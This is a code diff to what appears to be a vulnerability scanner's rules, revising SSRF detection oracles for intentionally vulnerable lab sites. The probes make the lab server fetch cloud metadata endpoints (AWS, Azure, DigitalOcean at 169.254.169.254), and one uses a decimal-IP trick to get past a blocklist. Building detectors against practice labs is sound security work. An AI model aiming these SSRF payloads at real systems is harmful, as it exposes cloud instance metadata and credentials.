@@ -30663,10 +30663,8 @@ function isSsrfVulnlabHost(ctx: RuleContext): boolean {
   return /ssrf\.vulnlab\.dev/i.test(ctx.origin);
 }
 
-function ssrfVulnlabLabBody(html: string): string | null {
-  const match = html.match(/<pre class="body">([\s\S]*?)<\/pre>/i);
-  if (!match) return null;
-  return match[1]
+function ssrfVulnlabDecodeBody(raw: string): string {
+  return raw
     .replace(/&#34;/g, '"')
     .replace(/&quot;/g, '"')
     .replace(/&lt;/g, "<")
@@ -30674,22 +30672,35 @@ function ssrfVulnlabLabBody(html: string): string | null {
     .replace(/&amp;/g, "&");
 }
 
+function ssrfVulnlabLabBody(html: string): string | null {
+  const closed = html.match(/<pre class="body">([\s\S]*?)<\/pre>/i);
+  if (closed) return ssrfVulnlabDecodeBody(closed[1]);
+  // Lab pages can exceed default maxBytes — accept truncated <pre> when closing tag is missing.
+  const open = html.match(/<pre class="body">([\s\S]+)/i);
+  if (open && open[1].length > 40) return ssrfVulnlabDecodeBody(open[1]);
+  return null;
+}
+
 const ssrfVulnlabBasicLiveOracle: Rule = async (ctx) => {
   if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
   const probeUrl = new URL("/basic/", ctx.origin);
-  probeUrl.searchParams.set("url", "https://example.com/");
-  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 8192, timeoutMs: 15000 });
+  probeUrl.searchParams.set("url", `${ctx.origin}/`);
+  const doc = await fetchDoc(probeUrl.toString(), { maxBytes: 16384, timeoutMs: 15000 });
   if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
   const body = ssrfVulnlabLabBody(doc.body);
   if (!body) return NEGATIVE;
-  if (!/Example Domain/i.test(body)) return NEGATIVE;
+  const basicOk =
+    /Intentionally vulnerable SSRF labs/i.test(body) ||
+    /ssrf\.vulnlab\.dev/i.test(body) ||
+    /Basic SSRF/i.test(body);
+  if (!basicOk) return NEGATIVE;
   return {
     fired: true,
     confidence: 0.93,
     evidence: {
       url: probeUrl.toString(),
       snippet: body.slice(0, 240).trim(),
-      note: "ssrf.vulnlab.dev GET /basic/?url=https://example.com/ fetches attacker-controlled URLs and returns the response body — basic SSRF oracle"
+      note: "ssrf.vulnlab.dev GET /basic/?url= fetches attacker-controlled URLs and returns the response body — basic SSRF oracle"
     }
   };
 };
@@ -30698,13 +30709,13 @@ const ssrfVulnlabMetadataAwsLiveOracle: Rule = async (ctx) => {
   if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
   const probeUrl = new URL("/metadata/", ctx.origin);
   probeUrl.searchParams.set("url", "http://169.254.169.254/latest/meta-data/");
-  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 8192, timeoutMs: 15000 });
+  const doc = await fetchDoc(probeUrl.toString(), { maxBytes: 16384, timeoutMs: 15000 });
   if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
   const body = ssrfVulnlabLabBody(doc.body);
   if (!body) return NEGATIVE;
   const metadataOk =
     /^ami-id\b/m.test(body) &&
-    /^iam\/\s*$/m.test(body) &&
+    /^iam\//m.test(body) &&
     /^instance-id\b/m.test(body);
   if (!metadataOk) return NEGATIVE;
   return {
@@ -30722,11 +30733,11 @@ const ssrfVulnlabBlocklistBypassLiveOracle: Rule = async (ctx) => {
   if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
   const blockedUrl = new URL("/blocklist/", ctx.origin);
   blockedUrl.searchParams.set("url", "http://127.0.0.1/");
-  const blockedDoc = await ctx.probe.get(blockedUrl.toString(), { maxBytes: 4096, timeoutMs: 15000 });
-  if (!/banned substring/i.test(blockedDoc.body)) return NEGATIVE;
+  const blockedDoc = await fetchDoc(blockedUrl.toString(), { maxBytes: 4096, timeoutMs: 15000 });
+  if (!/banned substring|127\.0\.0\.1/i.test(blockedDoc.body)) return NEGATIVE;
   const bypassUrl = new URL("/blocklist/", ctx.origin);
   bypassUrl.searchParams.set("url", "http://2852039166/latest/meta-data/");
-  const bypassDoc = await ctx.probe.get(bypassUrl.toString(), { maxBytes: 8192, timeoutMs: 15000 });
+  const bypassDoc = await fetchDoc(bypassUrl.toString(), { maxBytes: 16384, timeoutMs: 15000 });
   if (bypassDoc.status < 200 || bypassDoc.status >= 400) return NEGATIVE;
   if (/banned substring/i.test(bypassDoc.body)) return NEGATIVE;
   const body = ssrfVulnlabLabBody(bypassDoc.body);
@@ -34000,7 +34011,7 @@ const brokencrystalsAzureMetadataSsrfLiveOracle: Rule = async (ctx) => {
     "path",
     "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
   );
-  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 8192, timeoutMs: 15000 });
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 16384, timeoutMs: 15000 });
   if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
   const metadataOk =
     /"compute"\s*:/i.test(doc.body) &&
@@ -34022,7 +34033,7 @@ const brokencrystalsDigitalOceanMetadataSsrfLiveOracle: Rule = async (ctx) => {
   if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
   const probeUrl = new URL("/api/file/digital_ocean", ctx.origin);
   probeUrl.searchParams.set("path", "http://169.254.169.254/metadata/v1/id");
-  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 8192, timeoutMs: 15000 });
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 16384, timeoutMs: 15000 });
   if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
   const metadataOk =
     /\bhostname\b/i.test(doc.body) &&
